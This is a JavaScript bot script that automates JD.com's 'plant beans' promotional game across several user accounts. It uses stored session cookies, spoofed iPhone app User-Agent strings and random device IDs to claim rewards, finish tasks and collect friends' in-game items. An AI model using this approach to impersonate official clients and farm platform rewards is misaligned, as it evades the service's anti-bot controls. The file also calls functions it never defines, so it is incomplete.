/*
种豆得豆 脚本更新地址：https://raw.githubusercontent.com/Aaron-lv/sync/jd_scripts/jd_plantBean.js
更新时间：2021-04-9
活动入口：京东APP我的-更多工具-种豆得豆
已支持IOS京东多账号,云端多京东账号
脚本兼容: QuantumultX, Surge, Loon, JSBox, Node.js
注：会自动关注任务中的店铺跟商品，介意者勿使用。
互助码shareCode请先手动运行脚本查看打印可看到
每个京东账号每天只能帮助3个人。多出的助力码将会助力失败。
=====================================Quantumult X=================================
[task_local]
1 7-21/2 * * * https://raw.githubusercontent.com/Aaron-lv/sync/jd_scripts/jd_plantBean.js, tag=种豆得豆, img-url=https://raw.githubusercontent.com/58xinian/icon/master/jdzd.png, enabled=true
=====================================Loon================================
[Script]
cron "1 7-21/2 * * *" script-path=https://raw.githubusercontent.com/Aaron-lv/sync/jd_scripts/jd_plantBean.js,tag=京东种豆得豆
======================================Surge==========================
京东种豆得豆 = type=cron,cronexp="1 7-21/2 * * *",wake-system=1,timeout=3600,script-path=https://raw.githubusercontent.com/Aaron-lv/sync/jd_scripts/jd_plantBean.js
====================================小火箭=============================
京东种豆得豆 = type=cron,script-path=https://raw.githubusercontent.com/Aaron-lv/sync/jd_scripts/jd_plantBean.js, cronexpr="1 7-21/2 * * *", timeout=3600, enable=true
*/
const $ = new Env('京东种豆得豆');
//Node.js用户请在jdCookie.js处填写京东ck;
//ios等软件用户直接用NobyDa的jd cookie
let jdNotify = true;//是否开启静默运行。默认true开启
let cookiesArr = [], cookie = '', jdPlantBeanShareArr = [], isBox = false, notify, newShareCodes, option, message,subTitle;
//京东接口地址
const JD_API_HOST = 'https://api.m.jd.com/client.action';
//助力好友分享码(最多3个,否则后面的助力失败)
//此此内容是IOS用户下载脚本到本地使用，填写互助码的地方，同一京东账号的好友互助码请使用@符号隔开。
//下面给出两个账号的填写示例（iOS只支持2个京东账号）
let shareCodes = []
let allMessage = ``;
let currentRoundId = null;//本期活动id
let lastRoundId = null;//上期id
let roundList = [];
let awardState = '';//上期活动的京豆是否收取
let num;
let helpAuthor = false;
!(async () => {
  await requireConfig();
  if (!cookiesArr[0]) {
    $.msg($.name, '【提示】请先获取京东账号一cookie\n直接使用NobyDa的京东签到获取', 'https://bean.m.jd.com/bean/signIndex.action', {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});
    return;
  }
  for (let i = 0; i < cookiesArr.length; i++) {
    if (cookiesArr[i]) {
      cookie = cookiesArr[i];
      $.UserName = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1])
      $.index = i + 1;
      $.isLogin = true;
      $.nickName = '';
      await TotalBean();
      console.log(`\n开始【京东账号${$.index}】${$.nickName || $.UserName}\n`);
      if (!$.isLogin) {
        $.msg($.name, `【提示】cookie已失效`, `京东账号${$.index} ${$.nickName || $.UserName}\n请重新登录获取\nhttps://bean.m.jd.com/bean/signIndex.action`, {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});

        if ($.isNode()) {
          await notify.sendNotify(`${$.name}cookie已失效 - ${$.UserName}`, `京东账号${$.index} ${$.UserName}\n请重新登录获取cookie`);
        }
        continue
      }
      message = '';
      subTitle = '';
      option = {};
      await getUA()
      await getinfo()
      await shareCodesFormat();
      await jdPlantBean();
      await showMsg();
    }
  }
  if ($.isNode() && allMessage) {
    await notify.sendNotify(`${$.name}`, `${allMessage}`)
  }
})().catch((e) => {
  $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
}).finally(() => {
  $.done();
})

async function jdPlantBean() {
  try {
    console.log(`获取任务及基本信息`)
    await plantBeanIndex();
    if ($.plantBeanIndexResult.errorCode === 'PB101') {
      console.log(`\n活动太火爆了，还是去买买买吧！\n`)
      return
    }
    for (let i = 0; i < $.plantBeanIndexResult.data.roundList.length; i++) {
      if ($.plantBeanIndexResult.data.roundList[i].roundState === "2") {
        num = i
        break
      }
    }
    // console.log(plantBeanIndexResult.data.taskList);
    if ($.plantBeanIndexResult && $.plantBeanIndexResult.code === '0' && $.plantBeanIndexResult.data) {
      const shareUrl = $.plantBeanIndexResult.data.jwordShareInfo.shareUrl
      $.myPlantUuid = getParam(shareUrl, 'plantUuid')
      console.log(`\n【京东账号${$.index}（${$.UserName}）的${$.name}好友互助码】${$.myPlantUuid}\n`);
      roundList = $.plantBeanIndexResult.data.roundList;
      currentRoundId = roundList[num].roundId;//本期的roundId
      lastRoundId = roundList[num - 1].roundId;//上期的roundId
      awardState = roundList[num - 1].awardState;
      $.taskList = $.plantBeanIndexResult.data.taskList;
      subTitle = `【京东昵称】${$.plantBeanIndexResult.data.plantUserInfo.plantNickName}`;
      message += `【上期时间】${roundList[num - 1].dateDesc.replace('上期 ', '')}\n`;
      message += `【上期成长值】${roundList[num - 1].growth}\n`;
      await receiveNutrients();//定时领取营养液
      await doHelp();//助力
      await doTask();//做日常任务
      //await doEgg();
      await stealFriendWater();
      await doCultureBean();
      await doGetReward();
      await showTaskProcess();
      await plantShareSupportList();
    } else {
      console.log(`种豆得豆-初始失败:  ${JSON.stringify($.plantBeanIndexResult)}`);
    }
  } catch (e) {
    $.logErr(e);
    const errMsg = `京东账号${$.index} ${$.nickName || $.UserName}\n任务执行异常，请检查执行日志 ‼️‼️`;
    $.msg($.name, '', `京东账号${$.index} ${$.nickName || $.UserName}\n${errMsg}`)
  }
}
async function doGetReward() {
  console.log(`【上轮京豆】${awardState === '4' ? '采摘中' : awardState === '5' ? '可收获了' : '已领取'}`);
  if (awardState === '4') {
    //京豆采摘中...
    message += `【上期状态】${roundList[num - 1].tipBeanEndTitle}\n`;
  } else if (awardState === '5') {
    //收获
    await getReward();
    console.log('开始领取京豆');
    if ($.getReward && $.getReward.code === '0') {
      console.log('京豆领取成功');
      message += `【上期兑换京豆】${$.getReward.data.awardBean}个\n`;
      $.msg($.name, subTitle, message);
      allMessage += `京东账号${$.index} ${$.nickName}\n${message}${$.index !== cookiesArr.length ? '\n\n' : ''}`
      // if ($.isNode()) {
      //   await notify.sendNotify(`${$.name} - 账号${$.index} - ${$.nickName || $.UserName}`, `京东账号${$.index} ${$.nickName}\n${message}`);
      // }
    } else {
      console.log(`$.getReward 异常：${JSON.stringify($.getReward)}`)
    }
  } else if (awardState === '6') {
    //京豆已领取
    message += `【上期兑换京豆】${roundList[num - 1].awardBeans}个\n`;
  }
  if (roundList[1].dateDesc.indexOf('本期 ') > -1) {
    roundList[1].dateDesc = roundList[1].dateDesc.substr(roundList[1].dateDesc.indexOf('本期 ') + 3, roundList[1].dateDesc.length);
  }
  message += `【本期时间】${roundList[num].dateDesc}\n`;
  message += `【本期成长值】${roundList[num].growth}\n`;
}
async function doCultureBean() {
  await plantBeanIndex();
  if ($.plantBeanIndexResult && $.plantBeanIndexResult.code === '0') {
    const plantBeanRound = $.plantBeanIndexResult.data.roundList[num]
    if (plantBeanRound.roundState === '2') {
      //收取营养液
      if (plantBeanRound.bubbleInfos && plantBeanRound.bubbleInfos.length) console.log(`开始收取营养液`)
      for (let bubbleInfo of plantBeanRound.bubbleInfos) {
        console.log(`收取-${bubbleInfo.name}-的营养液`)
        await cultureBean(plantBeanRound.roundId, bubbleInfo.nutrientsType)
        console.log(`收取营养液结果:${JSON.stringify($.cultureBeanRes)}`)
      }
    }
  } else {
    console.log(`plantBeanIndexResult:${JSON.stringify($.plantBeanIndexResult)}`)
  }
}
async function stealFriendWater() {
  await stealFriendList();
  if ($.stealFriendList && $.stealFriendList.code === '0') {
    if ($.stealFriendList.data && $.stealFriendList.data.tips) {
      console.log('\n\n今日偷取好友营养液已达上限\n\n');
      return
    }
    if ($.stealFriendList.data && $.stealFriendList.data.friendInfoList && $.stealFriendList.data.friendInfoList.length > 0) {
      let nowTimes = new Date(new Date().getTime() + new Date().getTimezoneOffset()*60*1000 + 8*60*60*1000);
      for (let item of $.stealFriendList.data.friendInfoList) {
        if (new Date(nowTimes).getHours() === 20) {
          if (item.nutrCount >= 2) {
            // console.log(`可以偷的好友的信息::${JSON.stringify(item)}`);
            console.log(`可以偷的好友的信息paradiseUuid::${JSON.stringify(item.paradiseUuid)}`);
            await collectUserNutr(item.paradiseUuid);
            console.log(`偷取好友营养液情况:${JSON.stringify($.stealFriendRes)}`)
            if ($.stealFriendRes && $.stealFriendRes.code === '0') {
              console.log(`偷取好友营养液成功`)
            }
          }
        } else {
          if (item.nutrCount >= 3) {
            // console.log(`可以偷的好友的信息::${JSON.stringify(item)}`);
            console.log(`可以偷的好友的信息paradiseUuid::${JSON.stringify(item.paradiseUuid)}`);
            await collectUserNutr(item.paradiseUuid);
            console.log(`偷取好友营养液情况:${JSON.stringify($.stealFriendRes)}`)
            if ($.stealFriendRes && $.stealFriendRes.code === '0') {
              console.log(`偷取好友营养液成功`)
            }
          }
        }
      }
    }
  } else {
    console.log(`$.stealFriendList 异常： ${JSON.stringify($.stealFriendList)}`)
  }
}
async function doEgg() {
  await egg();
  if ($.plantEggLotteryRes && $.plantEggLotteryRes.code === '0') {
    if ($.plantEggLotteryRes.data.restLotteryNum > 0) {
      const eggL = new Array($.plantEggLotteryRes.data.restLotteryNum).fill('');
      console.log(`目前共有${eggL.length}次扭蛋的机会`)
      for (let i = 0; i < eggL.length; i++) {
        console.log(`开始第${i + 1}次扭蛋`);
        await plantEggDoLottery();
        console.log(`天天扭蛋成功：${JSON.stringify($.plantEggDoLotteryResult)}`);
      }
    } else {
      console.log('暂无扭蛋机会')
    }
  } else {
    console.log('查询天天扭蛋的机会失败' + JSON.stringify($.plantEggLotteryRes))
  }
}
async function doTask() {
  if ($.taskList && $.taskList.length > 0) {
    for (let item of $.taskList) {
      if (item.isFinished === 1) {
        console.log(`${item.taskName} 任务已完成\n`);
        continue;
      } else {
        if (item.taskType === 8) {
          console.log(`\n【${item.taskName}】任务未完成,需自行手动去京东APP完成，${item.desc}营养液\n`)
        } else {
          console.log(`\n【${item.taskName}】任务未完成,${item.desc}营养液\n`)
        }
      }
      if (item.dailyTimes === 1 && item.taskType !== 8) {
        console.log(`\n开始做 ${item.taskName}任务`);
        // $.receiveNutrientsTaskRes = await receiveNutrientsTask(item.taskType);
        await receiveNutrientsTask(item.taskType);
        console.log(`做 ${item.taskName}任务结果:${JSON.stringify($.receiveNutrientsTaskRes)}\n`);
      }
      if (item.taskType === 3) {
        //浏览店铺
        console.log(`开始做 ${item.taskName}任务`);
        let unFinishedShopNum = item.totalNum - item.gainedNum;
        if (unFinishedShopNum === 0) {
          continue
        }
        await shopTaskList();
        const { data } = $.shopTaskListRes;
        let goodShopListARR = [], moreShopListARR = [], shopList = [];
        if (!data.goodShopList) {
          data.goodShopList = [];
        }
        if (!data.moreShopList) {
          data.moreShopList = [];
        }
        const { goodShopList, moreShopList } = data;
        for (let i of goodShopList) {
          if (i.taskState === '2') {
            goodShopListARR.push(i);
          }
        }
        for (let j of moreShopList) {
          if (j.taskState === '2') {
            moreShopListARR.push(j);
          }
        }
        shopList = goodShopListARR.concat(moreShopListARR);
        for (let shop of shopList) {
          const { shopId, shopTaskId } = shop;
          const body = {
            "monitor_refer": "plant_shopNutrientsTask",
            "shopId": shopId,
            "shopTaskId": shopTaskId
          }
          const shopRes = await requestGet('shopNutrientsTask', body);
          console.log(`shopRes结果:${JSON.stringify(shopRes)}`);
          if (shopRes && shopRes.code === '0') {
            if (shopRes.data && shopRes.data.nutrState && shopRes.data.nutrState === '1') {
              unFinishedShopNum --;
            }
          }
          if (unFinishedShopNum <= 0) {
            console.log(`${item.taskName}任务已做完\n`)
            break;
          }
        }
      }
      if (item.taskType === 5) {
        //挑选商品
        console.log(`开始做 ${item.taskName}任务`);
        let unFinishedProductNum = item.totalNum - item.gainedNum;
        if (unFinishedProductNum === 0) {
          continue
        }
        await productTaskList();
        // console.log('productTaskList', $.productTaskList);
        const { data } = $.productTaskList;
        let productListARR = [], productList = [];
        const { productInfoList } = data;
        for (let i = 0; i < productInfoList.length; i++) {
          for (let j = 0; j < productInfoList[i].length; j++){
            productListARR.push(productInfoList[i][j]);
          }
        }
        for (let i of productListARR) {
          if (i.taskState === '2') {
            productList.push(i);
          }
        }
        for (let product of productList) {
          const { skuId, productTaskId } = product;
          const body = {
            "monitor_refer": "plant_productNutrientsTask",
            "productTaskId": productTaskId,
            "skuId": skuId
          }
          const productRes = await requestGet('productNutrientsTask', body);
          if (productRes && productRes.code === '0') {
            // console.log('nutrState', productRes)
            //这里添加多重判断,有时候会出现活动太火爆的问题,导致nutrState没有
            if (productRes.data && productRes.data.nutrState && productRes.data.nutrState === '1') {
              unFinishedProductNum --;
            }
          }
          if (unFinishedProductNum <= 0) {
            console.log(`${item.taskName}任务已做完\n`)
            break;
          }
        }
      }
      if (item.taskType === 10) {
        //关注频道
        console.log(`开始做 ${item.taskName}任务`);
        let unFinishedChannelNum = item.totalNum - item.gainedNum;
        if (unFinishedChannelNum === 0) {
          continue
        }
        await plantChannelTaskList();
        const { data } = $.plantChannelTaskList;
        // console.log('goodShopList', data.goodShopList);
        // console.log('moreShopList', data.moreShopList);
        let goodChannelListARR = [], normalChannelListARR = [], channelList = [];
        const { goodChannelList, normalChannelList } = data;
        for (let i of goodChannelList) {
          if (i.taskState === '2') {
            goodChannelListARR.push(i);
          }
        }
        for (let j of normalChannelList) {
          if (j.taskState === '2') {
            normalChannelListARR.push(j);
          }
        }
        channelList = goodChannelListARR.concat(normalChannelListARR);
        for (let channelItem of channelList) {
          const { channelId, channelTaskId } = channelItem;
          const body = {
            "channelId": channelId,
            "channelTaskId": channelTaskId
          }
          const channelRes = await requestGet('plantChannelNutrientsTask', body);
          console.log(`channelRes结果:${JSON.stringify(channelRes)}`);
          if (channelRes && channelRes.code === '0') {
            if (channelRes.data && channelRes.data.nutrState && channelRes.data.nutrState === '1') {
              unFinishedChannelNum --;
            }
          }
          if (unFinishedChannelNum <= 0) {
            console.log(`${item.taskName}任务已做完\n`)
            break;
          }
        }
      }
    }
  }
}
function showTaskProcess() {
  return new Promise(async resolve => {
    await plantBeanIndex();
    $.taskList = $.plantBeanIndexResult.data.taskList;
    if ($.taskList && $.taskList.length > 0) {
      console.log("     任务   进度");
      for (let item of $.taskList) {
        console.log(`[${item["taskName"]}]  ${item["gainedNum"]}/${item["totalNum"]}   ${item["isFinished"]}`);
      }
    }
    resolve()
  })
}
//助力好友
async function doHelp() {
  for (let plantUuid of newShareCodes) {
    console.log(`开始助力京东账号${$.index} - ${$.nickName}的好友: ${plantUuid}`);
    if (!plantUuid) continue;
    if (plantUuid === $.myPlantUuid) {
      console.log(`\n跳过自己的plantUuid\n`)
      continue
    }
    await helpShare(plantUuid);
    if ($.helpResult && $.helpResult.code === '0') {
      // console.log(`助力好友结果: ${JSON.stringify($.helpResult.data.helpShareRes)}`);
      if ($.helpResult.data.helpShareRes) {
        if ($.helpResult.data.helpShareRes.state === '1') {
          console.log(`助力好友${plantUuid}成功`)
          console.log(`${$.helpResult.data.helpShareRes.promptText}\n`);
        } else if ($.helpResult.data.helpShareRes.state === '2') {
          console.log('您今日助力的机会已耗尽，已不能再帮助好友助力了\n');
          break;
        } else if ($.helpResult.data.helpShareRes.state === '3') {
          console.log('该好友今日已满9人助力/20瓶营养液,明天再来为Ta助力吧\n')
        } else if ($.helpResult.data.helpShareRes.state === '4') {
          console.log(`${$.helpResult.data.helpShareRes.promptText}\n`)
        } else {
          console.log(`助力其他情况：${JSON.stringify($.helpResult.data.helpShareRes)}`);
        }
      }
    } else {
      console.log(`助力好友失败: ${JSON.stringify($.helpResult)}`);
    }
  }
}
function showMsg() {
  $.log(`\n${message}\n`);
  jdNotify = $.getdata('jdPlantBeanNotify') ? $.getdata('jdPlantBeanNotify') : jdNotify;
  if (!jdNotify || jdNotify === 'false') {
    $.msg($.name, subTitle, message);
  }
}
// ================================================此处是API=================================
//每轮种豆活动获取结束后,自动收取京豆
async function getReward() {
  const body = {
    "roundId": lastRoundId
  }
  $.getReward = await request('receivedBean', body);
}
//收取营养液
async function cultureBean(currentRoundId, nutrientsType) {
  let functionId = arguments.callee.name.toString();
  let body = {
    "roundId": currentRoundId,
    "nutrientsType": nutrientsType,
  }
  $.cultureBeanRes = await request(functionId, body);
}
//偷营养液大于等于3瓶的好友
//①查询好友列表
async function stealFriendList() {
  const body = {
    pageNum: '1'
  }
  $.stealFriendList = await request('plantFriendList', body);
}

//②执行偷好友营养液的动作
async function collectUserNutr(paradiseUuid) {
  console.log('开始偷好友');
  // console.log(paradiseUuid);
  let functionId = arguments.callee.name.toString();
  const body = {
    "paradiseUuid": paradiseUuid,
    "roundId": currentRoundId
  }
  $.stealFriendRes = await request(functionId, body);
}
async function receiveNutrients() {
  $.receiveNutrientsRes = await request('receiveNutrients', {"roundId": currentRoundId, "monitor_refer": "plant_receiveNutrients"})
  // console.log(`定时领取营养液结果:${JSON.stringify($.receiveNutrientsRes)}`)
}
async function plantEggDoLottery() {
  $.plantEggDoLotteryResult = await requestGet('plantEggDoLottery');
}
//查询天天扭蛋的机会
async function egg() {
  $.plantEggLotteryRes = await requestGet('plantEggLotteryIndex');
}
async function productTaskList() {
  let functionId = arguments.callee.name.toString();
  $.productTaskList = await requestGet(functionId, {"monitor_refer": "plant_productTaskList"});
}
async function plantChannelTaskList() {
  let functionId = arguments.callee.name.toString();
  $.plantChannelTaskList = await requestGet(functionId);
  // console.log('$.plantChannelTaskList', $.plantChannelTaskList)
}
async function shopTaskList() {
  let functionId = arguments.callee.name.toString();
  $.shopTaskListRes = await requestGet(functionId, {"monitor_refer": "plant_receiveNutrients"});
  // console.log('$.shopTaskListRes', $.shopTaskListRes)
}
async function receiveNutrientsTask(awardType) {
  const functionId = arguments.callee.name.toString();
  const body = {
    "monitor_refer": "receiveNutrientsTask",
    "awardType": `${awardType}`,
  }
  $.receiveNutrientsTaskRes = await requestGet(functionId, body);
}
async function plantShareSupportList() {
  $.shareSupportList = await requestGet('plantShareSupportList', {"roundId": ""});
  if ($.shareSupportList && $.shareSupportList.code === '0') {
    const { data } = $.shareSupportList;
    //当日北京时间0点时间戳
    const UTC8_Zero_Time = parseInt((Date.now() + 28800000) / 86400000) * 86400000 - 28800000;
    //次日北京时间0点时间戳
    const UTC8_End_Time = parseInt((Date.now() + 28800000) / 86400000) * 86400000 - 28800000 + (24 * 60 * 60 * 1000);
    let friendList = [];
    data.map(item => {
      if (UTC8_Zero_Time <= item['createTime'] && item['createTime'] < UTC8_End_Time) {
        friendList.push(item);
      }
    })
    message += `【助力您的好友】共${friendList.length}人`;
  } else {
    console.log(`异常情况：${JSON.stringify($.shareSupportList)}`)
  }
}
//助力好友的api
async function helpShare(plantUuid) {
  console.log(`\n开始助力好友: ${plantUuid}`);
  const body = {
    "plantUuid": plantUuid,
    "wxHeadImgUrl": "",
    "shareUuid": "",
    "followType": "1",
  }
  $.helpResult = await request(`plantBeanIndex`, body);
  console.log(`助力结果的code:${$.helpResult && $.helpResult.code}`);
}
async function plantBeanIndex() {
  $.plantBeanIndexResult = await request('plantBeanIndex');//plantBeanIndexBody
}
function readShareCode() {
  console.log(`开始`)
  return new Promise(async resolve => {
    $.get({url: "https://wuzhi03.coding.net/p/dj/d/RandomShareCode/git/raw/main/JD_Plant_Bean.json",headers:{
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1 Edg/87.0.4280.88"
      }}, async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，将切换为备用API`)
          console.log(`随机取助力码放到您固定的互助码后面(不影响已有固定互助)`)
          $.get({url: `https://raw.githubusercontent.com/shuyeshuye/RandomShareCode/main/JD_Plant_Bean.json`, 'timeout': 10000},(err, resp, data)=>{
            data = JSON.parse(data);})
        } else {
          if (data) {
            console.log(`随机取助力码放到您固定的互助码后面(不影响已有固定互助)`)
            data = JSON.parse(data);
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
    await $.wait(15000);
    resolve()
  })
}
//格式化助力码
function shareCodesFormat() {
  return new Promise(async resolve => {
    // console.log(`第${$.index}个京东账号的助力码:::${jdPlantBeanShareArr[$.index - 1]}`)
    newShareCodes = []
    if (jdPlantBeanShareArr[$.index - 1]) {
      newShareCodes = newShareCodes.concat(jdPlantBeanShareArr[$.index - 1].split('@'));
    }/* else {
      console.log(`由于您第${$.index}个京东账号未提供shareCode,将采纳本脚本自带的助力码\n`)
      const tempIndex = $.index > shareCodes.length ? (shareCodes.length - 1) : ($.index - 1);
      newShareCodes = shareCodes[tempIndex].split('@');
    }
    const readShareCodeRes = await readShareCode();
    if (readShareCodeRes && readShareCodeRes.code === 200) {
      newShareCodes = [...new Set([...newShareCodes, ...(readShareCodeRes.data || [])])];
    }*/
    console.log(`第${$.index}个京东账号将要助力的好友${JSON.stringify(newShareCodes)}`)
    resolve();
  })
}
function requireConfig() {
  return new Promise(resolve => {
    console.log('开始获取种豆得豆配置文件\n')
    notify = $.isNode() ? require('./sendNotify') : '';
    //Node.js用户请在jdCookie.js处填写京东ck;
    const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
    const jdPlantBeanShareCodes = $.isNode() ? require('./jdPlantBeanShareCodes.js') : '';
    //IOS等用户直接用NobyDa的jd cookie
    if ($.isNode()) {
      Object.keys(jdCookieNode).forEach((item) => {
        if (jdCookieNode[item]) {
          cookiesArr.push(jdCookieNode[item])
        }
      })
      if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {};
    } else {
      cookiesArr = [$.getdata('CookieJD'), $.getdata('CookieJD2'), ...jsonParse($.getdata('CookiesJD') || "[]").map(item => item.cookie)].filter(item => !!item);
    }
    console.log(`共${cookiesArr.length}个京东账号\n`)
    if ($.isNode()) {
      Object.keys(jdPlantBeanShareCodes).forEach((item) => {
        if (jdPlantBeanShareCodes[item]) {
          jdPlantBeanShareArr.push(jdPlantBeanShareCodes[item])
        }
      })
    } else {
      const boxShareCodeArr = ['jd_plantBean1', 'jd_plantBean2', 'jd_plantBean3'];
      const boxShareCodeArr2 = ['jd2_plantBean1', 'jd2_plantBean2', 'jd2_plantBean3'];
      const isBox1 = boxShareCodeArr.some((item) => {
        const boxShareCode = $.getdata(item);
        return (boxShareCode !== undefined && boxShareCode !== null && boxShareCode !== '');
      });
      const isBox2 = boxShareCodeArr2.some((item) => {
        const boxShareCode = $.getdata(item);
        return (boxShareCode !== undefined && boxShareCode !== null && boxShareCode !== '');
      });
      isBox = isBox1 ? isBox1 : isBox2;
      if (isBox1) {
        let temp = [];
        for (const item of boxShareCodeArr) {
          if ($.getdata(item)) {
            temp.push($.getdata(item))
          }
        }
        jdPlantBeanShareArr.push(temp.join('@'));
      }
      if (isBox2) {
        let temp = [];
        for (const item of boxShareCodeArr2) {
          if ($.getdata(item)) {
            temp.push($.getdata(item))
          }
        }
        jdPlantBeanShareArr.push(temp.join('@'));
      }
    }
    // console.log(`\n种豆得豆助力码::${JSON.stringify(jdPlantBeanShareArr)}`);
    console.log(`您提供了${jdPlantBeanShareArr.length}个账号的种豆得豆助力码\n`);
    resolve()
  })
}
function requestGet(function_id, body = {}) {
  if (!body.version) {
    body["version"] = "9.0.0.1";
  }
  body["monitor_source"] = "plant_app_plant_index";
  body["monitor_refer"] = "";
  return new Promise(async resolve => {
    await $.wait(2000);
    const option = {
      url: `${JD_API_HOST}?functionId=${function_id}&body=${escape(JSON.stringify(body))}&appid=ld`,
      headers: {
        'Cookie': cookie,
        'Host': 'api.m.jd.com',
        'Accept': '*/*',
        'Connection': 'keep-alive',
        'User-Agent': 'JD4iPhone/167283 (iPhone;iOS 13.6.1;Scale/3.00)',
        'Accept-Language': 'zh-Hans-CN;q=1,en-CN;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': "application/x-www-form-urlencoded"
      },
      timeout: 10000,
    };
    $.get(option, (err, resp, data) => {
      try {
        if (err) {
          console.log('\n种豆得豆: API查询请求失败 ‼️‼️')
          $.logErr(err);
        } else {
          data = JSON.parse(data);
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve(data);
      }
    })
  })
}
function TotalBean() {
  return new Promise(async resolve => {
    const options = {
      "url": `https://wq.jd.com/user/info/QueryJDUserInfo?sceneval=2`,
      "headers": {
        "Accept": "application/json,text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-cn",
        "Connection": "keep-alive",
        "Cookie": cookie,
        "Referer": "https://wqs.jd.com/my/jingdou/my.shtml?sceneval=2",
        "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.4.4;14.3;network/4g;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1")
      },
      "timeout": 10000,
    }
    $.post(options, (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (data) {
            data = JSON.parse(data);
            if (data['retcode'] === 13) {
              $.isLogin = false; //cookie过期
              return
            }
            if (data['retcode'] === 0) {
              $.nickName = (data['base'] && data['base'].nickname) || $.UserName;
            } else {
              $.nickName = $.UserName
            }
          } else {
            console.log(`京东服务器返回空数据`)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function request(function_id, body = {}){
  return new Promise(async resolve => {
    await $.wait(2000);
    $.post(taskUrl(function_id, body), (err, resp, data) => {
      try {
        if (err) {
          console.log('\n种豆得豆: API查询请求失败 ‼️‼️')
          console.log(`function_id:${function_id}`)
          $.logErr(err);
        } else {
          data = JSON.parse(data);
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve(data);
      }
    })
  })
}
function taskUrl(function_id, body) {
  body["version"] = "9.2.4.0";
  body["monitor_source"] = "plant_app_plant_index";
  body["monitor_refer"] = "";
  return {
    url: JD_API_HOST,
    body: `functionId=${function_id}&body=${escape(JSON.stringify(body))}&appid=ld&client=apple&area=19_1601_50258_51885&build=167490&clientVersion=9.3.2`,
    headers: {
      "Cookie": cookie,
      "Host": "api.m.jd.com",
      "Accept": "*/*",
      "Connection": "keep-alive",
      "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.4.4;14.3;network/4g;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1"),
      "Accept-Language": "zh-Hans-CN;q=1,en-CN;q=0.9",
      "Accept-Encoding": "gzip, deflate, br",
      "Content-Type": "application/x-www-form-urlencoded"
    },
    timeout: 10000,
  }
}
function getParam(url, name) {
  const reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i")
  const r = url.match(reg)
  if (r != null) return unescape(r[2]);
  return null;
}
function jsonParse(str) {
  if (typeof str == "string") {
    try {
      return JSON.parse(str);
    } catch (e) {
      console.log(e);
      $.msg($.name, '', '请勿随意在BoxJs输入框修改内容\n建议通过脚本去获取cookie')
      return [];
    }
  }
}
async function getUA(){
  $.UA = `jdpingou;iPhone;10.1.2;14.5.1;${randomString(40)};network/wifi;model/iPhone13,2;appBuild/100736;ADID/;supportApplePay/1;hasUPPay/0;pushNoticeIsOpen/0;hasOCPay/0;supportBestPay/0;session/820;pap/JA2019_3111789;brand/apple;supportJDSHWK/1;Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148`
}
function randomString(e) {
  e = e || 32;
  let t = "abcdef0123456789", a = t.length, n = "";
  for (i = 0; i < e; i++)
    n += t.charAt(Math.floor(Math.random() * a));
  return n
}
